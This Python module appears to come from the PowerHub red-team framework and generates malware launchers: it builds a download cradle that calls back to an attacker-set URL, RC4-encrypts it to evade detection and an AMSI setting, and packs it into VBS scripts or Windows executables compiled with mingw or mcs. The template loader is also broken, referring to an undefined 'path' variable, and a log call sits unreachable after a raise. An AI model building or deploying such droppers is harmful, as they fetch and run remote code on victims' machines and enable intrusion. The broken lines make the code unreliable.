import logging
import subprocess
import tempfile
import os

import jinja2

from powerhub.tools import encrypt_rc4, generate_random_key
from powerhub.stager import build_cradle, symbol_name
from powerhub.directories import directories

log = logging.getLogger(__name__)


def load_template(filename, **kwparameters):
    """Wrapper for loading a jinja2 template from file"""
    templateLoader = jinja2.FileSystemLoader(
        searchpath=os.path.join(directories.BASE_DIR, "templates", "payloads")
    )
    templateLoader = jinja2.FileSystemLoader(searchpath=path)
    templateEnv = jinja2.Environment(loader=templateLoader)
    TEMPLATE_FILE = filename
    template = templateEnv.get_template(TEMPLATE_FILE)
    outputText = template.render(**kwparameters)
    return outputText


def create_filename(parameters):
    result = 'powerhub'
    result += '-' + parameters['launcher']
    result += '-' + parameters['amsi']
    result += '-' + parameters['transport']
    if str(parameters['clip-exec']) != '-1':
        result += '-' + parameters['clip-exec']
    if parameters['launcher'] in [
        'mingw32',
        'dotnetexe',
    ]:
        result += '-' + parameters['arch']
        result += '.exe'
    elif parameters['launcher'] == 'vbs':
        result += ".vbs"
    return result


def create_payload(parameters, key, callback_url):
    payload_generators = {
        "mingw32": create_exe,
        "dotnetexe": create_dotnet,
        "vbs": create_vbs,
        #  "wordmacro": create_docx,
        #  "rundll32": create_exe,
        #  "installutil": create_exe,
    }
    return payload_generators[parameters['launcher']](parameters, key, callback_url)


def create_vbs(parameters, key, callback_url):
    filename = create_filename(parameters)
    parameters.get_by_label('launcher').value = 'cmd_enc'
    cmd = build_cradle(parameters, key, callback_url).replace('\n', '')
    cmd = ('CreateObject("WScript.Shell").' +
           'exec("%s")') % cmd
    key = generate_random_key(16)
    cmd = encrypt_rc4(cmd.encode(), key)
    vbs_code = load_template(
        'powerhub.vbs',
        HEX_CODE=' '.join('%02X' % c for c in cmd),
        HEX_KEY=' '.join('%02X' % ord(c) for c in key),
        symbol_name=symbol_name,
    )
    return filename, vbs_code


def create_docx(parameters, key, callback_url):
    _, vbs_code = create_vbs(parameters, key, callback_url)
    # randomize creator in docProps/core.xml


def compile_source(parameters, key, callback_url, source_file, compile_cmd, formatter):
    filename = create_filename(parameters)
    parameters.get_by_label('launcher').value = 'cmd_enc'
    cmd = build_cradle(parameters, key, callback_url)
    size = len(cmd)
    key = generate_random_key(16)
    cmd = encrypt_rc4(cmd.encode(), key)
    c_code = load_template(
        source_file,
        CMD=formatter(cmd),
        LEN_CMD=size,
        KEY=key,
    )

    with tempfile.TemporaryDirectory() as tmpdirname:
        outfile = os.path.join(tmpdirname, 'powerhub.out')
        infile = os.path.join(tmpdirname, 'powerhub.in')
        with open(infile, 'w') as f:
            f.write(c_code)
        pipe = subprocess.Popen(
            compile_cmd(outfile) + [infile],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
        )
        out = pipe.communicate()
        if pipe.returncode == 0:
            with open(outfile, 'rb') as f:
                result = f.read()
        else:
            raise RuntimeError('Compiling the payload failed, '
                               'see console output')
            log.error('Compiling the payload failed: ' + out)

    return filename, result


def create_exe(parameters, key, callback_url):
    if parameters['arch'] == '32bit':
        mingw = 'i686-w64-mingw32-gcc'
    else:
        mingw = 'x86_64-w64-mingw32-gcc'

    return compile_source(
        parameters,
        key,
        callback_url,
        'powerhub.c',
        lambda outfile: [mingw, "-Wall", "-x", "c", "-o", outfile],
        lambda cmd: ''.join('\\x%02x' % c for c in cmd),
    )


def create_dotnet(parameters, key, callback_url):
    if parameters['arch'] == '32bit':
        platform = "x86"
    else:
        platform = "x64"

    return compile_source(
        parameters,
        key,
        callback_url,
        'powerhub.cs',
        lambda outfile: ["mcs", "-warnaserror",
                         "-platform:" + platform, "-out:" + outfile],
        lambda cmd: ','.join('0x%02x' % c for c in cmd),
    )
